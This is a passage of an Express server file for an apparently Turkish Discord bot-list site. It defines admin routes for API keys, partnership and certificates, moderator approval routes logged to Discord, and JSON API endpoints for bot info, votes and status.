  var embed = new Discord.RichEmbed()
    .setColor(process.env.embedColor)
    .setTitle("Karaliste'den kullanıcı silindi!")
    .setDescription(`
⠀
**|** Kullanıcı**:** <@${id}> (\`${id}\`)

**|** Kaldıran: <@${req.user.id}>
`)
  
  var log = client.channels.get("786954715866988584")
  log.send(embed)
  
  res.redirect('/admin/kara-remove')
  
});
  
//--------------------------------------------------------------//
  
app.post("/admin/key-save", checkAuth, (req, res) => {
  
  if(!client.admin.includes(req.user.id) ) return res.redirect('/yetkili/hata')
  let ayar = req.body
  if (ayar === {} || !ayar['user-idd']) return res.redirect('/admin/key-save')
  let id = ayar['user-idd']

  var apikey = db.fetch(`apikey_${id}`)
  
  if (!apikey) return res.redirect('/admin/key-save')
  var asılkey = db.fetch(`apianahtar_${apikey}`)
  
  if (asılkey !== "aski") return res.redirect('/admin/key-save')
  
  db.set(`apianahtar_${apikey}`, true)
  
  var embed = new Discord.RichEmbed()
    .setColor(process.env.embedColor)
    .setTitle("API anahtarı açıldı!")
    .setDescription(`
⠀
**|** Kullanıcı**:** <@${id}>

**|** Açan: <@${req.user.id}>
`)
  
  var log = client.channels.get("786954715866988584")
  log.send(embed)
  
  res.redirect('/admin/key-save')
  
});
  
//--------------------------------------------------------------//

app.post("/admin/key-aski", checkAuth, (req, res) => {
  
  if(!client.admin.includes(req.user.id) ) return res.redirect('/yetkili/hata')
  let ayar = req.body
  if (ayar === {} || !ayar['user-id']) return res.redirect('/admin/key-aski')
  let id = ayar['user-id']

  var apikey = db.fetch(`apikey_${id}`)
  
  if (!apikey) return res.redirect('/admin/key-aski')
  var asılkey = db.fetch(`apianahtar_${apikey}`)
  
  if (asılkey === "aski") return res.redirect('/admin/key-aski')
  
  db.set(`apianahtar_${apikey}`, "aski")
  
  var embed = new Discord.RichEmbed()
    .setColor(process.env.embedColor)
    .setTitle("API anahtarı askıya alındı!")
    .setDescription(`
⠀
**|** Kullanıcı**:** <@${id}>

**|** Alan: <@${req.user.id}>
`)
  
  var log = client.channels.get("786954715866988584")
  log.send(embed)
  
  res.redirect('/admin/key-aski')
  
});
  
//--------------------------------------------------------------//
  
app.post("/admin/partner-sil", checkAuth, (req, res) => {
  
  if(!client.admin.includes(req.user.id) ) return res.redirect('/yetkili/hata')
  let ayar = req.body
  if (ayar === {} || !ayar['part-id-sil']) return res.redirect('/admin/partner-sil')
  let id = ayar['part-id-sil']
  let owneridd = db.fetch(`botlar.${id}.sahipid`)
  
  if (db.has('botlar')) {
      if (Object.keys(db.fetch('botlar')).includes(id) === false) {
      res.redirect('/admin/partner-sil')
      return
   }
  }
  
  db.delete(`botlar.${id}.partner`)  
  
  var embed = new Discord.RichEmbed()
    .setColor(process.env.embedColor)
    .setTitle("Partnerlik silindi!")
    .setDescription(`
⠀ **|** Kullanıcı**:** <@${owneridd}>
**|** Bot**:** <@${id}>

**|** Kaldıran: <@${req.user.id}>
`)
  
  var log = client.channels.get("786954715866988584")
  log.send(embed)
  
  res.redirect('/admin/partner-sil')
  
});
  
//--------------------------------------------------------------//
  
app.post("/admin/sertifika-sil", checkAuth, (req, res) => {
  
  if(!client.admin.includes(req.user.id) ) return res.redirect('/yetkili/hata')
  let ayar = req.body
  if (ayar === {} || !ayar['ser-id-sil']) return res.redirect('/admin/sertifika-sil')
  let id = ayar['ser-id-sil']
  let owneridd = db.fetch(`botlar.${id}.sahipid`)
  
  if (db.has('botlar')) {
      if (Object.keys(db.fetch('botlar')).includes(id) === false) {
      res.redirect('/admin/sertifika-sil')
      return
   }
  }
  
  db.delete(`botlar.${id}.sertifika`)  
  db.delete(`sertifikak.${owneridd}.durum`)
  
  var embed = new Discord.RichEmbed()
    .setColor(process.env.embedColor)
    .setTitle("Sertifika silindi!")
    .setDescription(`
⠀
**|** Kullanıcı**:** <@${owneridd}>
**|** Bot**:** <@${id}>

**|** Kaldıran: <@${req.user.id}>
`)
  
  var log = client.channels.get("786954715866988584")
  log.send(embed)
  
  res.redirect('/admin/sertifika-sil')
  
});
  
  
  
app.get("/yetkili/sil/:botID", checkAuth, (req, res) => {
  let id = req.params.botID
  if(!db.has(`yetkili.${req.user.id}.durum`) ) return res.redirect('/yetkili/hata')
  var sahipid = db.fetch(`botlar.${id}.sahipid`)
  
  db.delete(`botlar.${id}`)
  db.delete(`kbotlar.${sahipid}.${id}`)
  
  var embed = new Discord.RichEmbed()
    .setColor(process.env.embedColor)
    .setTitle("Başvuru reddedildi!")
    .setDescription(`
⠀
**|** Kullanıcı**:** <@${sahipid}> (\`${sahipid}\`)
**|** Bot**:** <@${id}> (\`${id}\`)

**|** Yetkili: <@${req.user.id}>
`)
  
  var log = client.channels.get("786954715866988584")
  log.send(embed)
  
  renderTemplate(res, req, "silindi.ejs")
})
  
  
  
  
    app.get("/admin/yetkili-sifirla/", checkAuth, (req, res) => {
  if(!client.admin.includes(req.user.id) ) return res.redirect('/yetkili/hata')
  renderTemplate(res, req, "admin-p-sifirla.ejs")
});

app.post("/admin/yetkili-sifirla/", checkAuth, (req, res) => {
  if(!client.admin.includes(req.user.id) ) return res.redirect('/yetkili/hata')
  
  
  
     const sorted = Object.keys(db.fetch('botlar')).sort((a, b) => { return })
   const top = sorted.splice(0, Object.keys(db.fetch('botlar')).length) 
   const map = top.map(x=>x) 
	 for(var i = 0; i < Object.keys(db.fetch('botlar')).length; i++) { 
   let idd = map[i] 
          
 db.delete(`botlar.${idd}.oy`)
     
   }
  
  db.delete(`oylar`)
  
 res.status(404).json({ error: 'Bütün oylar başarıyla sıfırlandı!' });
  
});
  
  
  
  
  
  
  
app.get("/botyonetici/onayla/:botID", checkAuth, (req, res) => {
 if(!db.has(`yetkili.${req.user.id}.durum`) ) return res.redirect('/yetkili/hata')
let id = req.params.botID
let sahipid = db.fetch(`botlar.${id}.sahipid`)
let sahip = client.users.get(sahipid)

db.set(`botlar.${id}.durum`, 'Onaylı')

res.redirect("/yetkili")
                                                    
var embed = new Discord.RichEmbed()
    .setColor("AQUA")
    .setTitle("Başvuru kabul edildi!")
    .setDescription(`
⠀
**|** Kullanıcı**:** <@${sahipid}>
**|** Bot**:** <@${id}>

**|** Yetkili: <@${req.user.id}>
`)
  
  var log = client.channels.get("786954715866988584")
  log.send(embed)
  sahip.addRole(client.ayarlar.gelistirici)
});
//API

app.get("/api/bot/:botID", (req, res) => {
   var id = req.params.botID
   var key = req.query.key
   if (!key) {
     res.json({
       error: "Lütfen bir API anahtarı giriniz!"
     })
     return
   }
   if (!db.fetch(`apianahtar_${key}`)) {
     res.json({
       error: "Girdiğiniz anahtar geçersizdir!"
     })
     return
   }
   if (db.fetch(`apianahtar_${key}`) === "aski") {
     res.json({
       error: "Girdiğiniz anahtar askıya alınmış!"
     })
     return
   }
  
   if (db.has('botlar')) {
      if (Object.keys(db.fetch('botlar')).includes(id) === false) {
     res.json({
       error: 'ID geçersiz!'
     });
   }
  }

    res.json({
        name: db.fetch(`botlar.${id}.isim`) || 'Not found!',
        id: id || 'Not found!',
        avatar: db.fetch(`botlar.${id}.avatar`) || 'Not found!',
        prefix: db.fetch(`botlar.${id}.prefix`) || 'Not found!',
        library: db.fetch(`botlar.${id}.kutuphane`) || 'Not found!',
        owner: db.fetch(`botlar.${id}.sahip`) || 'Not found!',
        banner: db.fetch(`botlar.${id}.banner`) || 'Not found!',
        ownerid: db.fetch(`botlar.${id}.sahipid`) || 'Not found!',
        short_description: db.fetch(`botlar.${id}.kisaaciklama`) || 'Not found!',
        long_description: db.fetch(`botlar.${id}.uzunaciklama`) || 'Not found!',
        support_server: db.fetch(`botlar.${id}.destek`) || 'Not found!',    
        vote_number: db.fetch(`botlar.${id}.oy`) || 0,
        verified: db.fetch(`botlar.${id}.sertifika`) || 'Not found!'
    });
});
  
  
  
  app.get("/api/user/:userID", (req, res) => {
   var id = req.params.userID

   var key = req.query.key
   if (!key) {
     res.json({
       error: "Lütfen bir API anahtarı giriniz!"
     })
     return
   }
   if (!db.fetch(`apianahtar_${key}`)) {
     res.json({
       error: "Girdiğiniz anahtar geçersizdir!"
     })
     return
   }
   if (db.fetch(`apianahtar_${key}`) === "aski") {
     res.json({
       error: "Girdiğiniz anahtar askıya alınmış!"
     })
     return
   }
   
      if (db.has('user')) {
      if (Object.keys(db.fetch('user')).includes(id) === false) {
     res.json({
       error: 'User not found.'
     });
   }
  }
   
    res.json({
       founder: client.admin.includes(id) || false,
       moderator: db.fetch(`yetkili.${id}.durum`) || false,
       developer: db.fetch(`sertifikak.${id}.durum`) || false
    });
});
  
app.get("/api/bots", (req, res) => {
  var key = req.query.key
   if (!key) {
     res.json({
       error: "Lütfen bir API anahtarı giriniz!"
     })
     return
   }
   if (!db.fetch(`apianahtar_${key}`)) {
     res.json({
       error: "Girdiğiniz anahtar geçersizdir!"
     })
     return
   }
   if (db.fetch(`apianahtar_${key}`) === "aski") {
     res.json({
       error: "Girdiğiniz anahtar askıya alınmış!"
     })
     return
   }
  
  var toplambot = Object.getOwnPropertyNames(db.fetch("botlar"))
  res.json(toplambot.length)
});
  

  
app.get("/api/bot/:botID/vote/:kullaniciID", (req, res) => {
  var id = req.params.botID
  var userr = req.params.kullaniciID

  var key = req.query.key
   if (!key) {
     res.json({
       error: "Lütfen bir API anahtarı giriniz!"
     })
     return
   }
   if (!db.fetch(`apianahtar_${key}`)) {
     res.json({
       error: "Girdiğiniz anahtar geçersizdir!"
     })
     return
   }
   if (db.fetch(`apianahtar_${key}`) === "aski") {
     res.json({
       error: "Girdiğiniz anahtar askıya alınmış!"
     })
     return
   }
  
  if (db.has('botlar')) {
      if (Object.keys(db.fetch('botlar')).includes(id) === false) {
     res.json({
       error: "Bot not found!"
     });
   }
  }
 
   res.json({
     vote: db.has(`oylar.${id}.${userr}`) ? `true` : `false`,
   });

});


app.get("/api/bot/:botID/votes", (req, res) => {
  var id = req.params.botID
  var userr = req.params.kullaniciID

  var key = req.query.key
   if (!key) {
     res.json({
       error: "Lütfen bir API anahtarı giriniz!"
     })
     return
   }
   if (!db.fetch(`apianahtar_${key}`)) {
     res.json({
       error: "Girdiğiniz anahtar geçersizdir!"
     })
     return
   }
   if (db.fetch(`apianahtar_${key}`) === "aski") {
     res.json({
       error: "Girdiğiniz anahtar askıya alınmış!"
     })
     return
   }
  
  if (db.has('botlar')) {
      if (Object.keys(db.fetch('botlar')).includes(id) === false) {
     res.json({
       error: 'Bot not found.'
     });
   }
  }
 
   res.json({
     votes: db.fetch(`botlar.${id}.oy`) || 0,
     hasVoted : db.fetch(`oylar.${id}`) || '',
   });

});
  
app.get('/api/send', async (req, res) => {
  var id = req.headers.id
  var users = req.headers.users
  var guilds = req.headers.guilds
  var bot = db.fetch(`botid.${id}`)
  if (!id) { res.status(401).json({ success: false, message: "Yetkilendirme eksik!" })
    return
  }
  if (!guilds) { res.status(401).json({ success: false, message: "Sunucu sayısı eksik!" })
    return
  }
  if (!users) { res.status(401).json({ success: false, message: "Kullanıcı sayısı eksik!" })
    return
  }
  if (!db.fetch(`botid.${id}`)) { res.status(400).json({ success: false, message: "Yazdığınız List of Bots ID numarası geçersizdir!" })
    return
  }
  db.set(`botlar.${bot}.sunucu`, guilds)
  db.set(`botlar.${bot}.kullanıcı`, users)
  res.status(200).json({ success: true,
    message: db.fetch(`botlar.${bot}.isim`) + " adlı botun sunucu sayısı " + guilds + ", kullanıcı sayısı " + users + " olarak ayarlandı!"
  })
})

app.get('/api/bot/:id/status', (req, res) => {
  
  var key = req.query.key
   if (!key) {
     res.json({
       error: "Lütfen bir API anahtarı giriniz!"
     })
     return
   }
   if (!db.fetch(`apianahtar_${key}`)) {
     res.json({
       error: "Girdiğiniz anahtar geçersizdir!"
     })
     return
   }
   if (db.fetch(`apianahtar_${key}`) === "aski") {
     res.json({
       error: "Girdiğiniz anahtar askıya alınmış!"
     })
     return
   }
  
  if (db.has('botlar')) {
      if (Object.keys(db.fetch('botlar')).includes(req.params.id) === false) {
     res.json({
       error: "Bot not found!"
     });
   }
  }
  
  client.fetchUser(req.params.id).then(user=>{
    var Durum = user.presence.status
    var Durm = (Durum == "online" ? "Online" : (Durum == "offline" ? "Offline" : (Durum == "idle" ? "İdle" : (Durum == "dnd" ? "Dnd" : "HATA"))))
  if (user) {
    res.send({
      durumu: Durm
    })
  } else {
    res.send({
      durumu: null
    })
  }
      }).catch(e=>{
        res.send({
      durumu: null
    })
  });
});

app.get("/discord", async (req, res) => {
  await res.redirect('/redirect?to=dc');
});
  
  
app.get("/404", (req, res) => {renderTemplate(res, req, "bulanamadi.ejs")})
  
app.get('*', (req, res) => {
  return res.redirect('/404')
});


  
  
  
  
  function checkHttps(req, res, next){

  
  if(req.get('X-Forwarded-Proto').indexOf("https")!=-1){
    return next()
  } else {
    res.redirect('https://' + req.hostname + req.url);
  }
}

app.all('*', checkHttps);
  
  
  
 // PORT
  app.listen(3000);

  
};
 


